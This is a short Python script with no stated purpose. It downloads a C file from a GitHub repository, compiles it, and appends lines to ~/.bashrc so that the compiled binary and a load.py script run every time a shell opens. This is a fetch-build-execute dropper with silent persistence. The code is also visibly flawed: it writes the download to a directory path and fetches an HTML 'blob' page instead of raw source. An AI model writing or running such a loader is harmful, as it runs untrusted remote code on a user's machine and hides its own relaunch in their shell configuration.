import urllib.request
import os


print('downloading files ... ')

urllib.request.urlretrieve('https://github.com/ihak223/skech/blob/main/main.c', os.getcwd())

os.system('gcc main.c')

os.system(f'echo exec {os.getcwd()}/a.out >> ~/.bashrc')

os.system(f'echo python3 {os.getcwd()}/load.py >> ~/.bashrc')


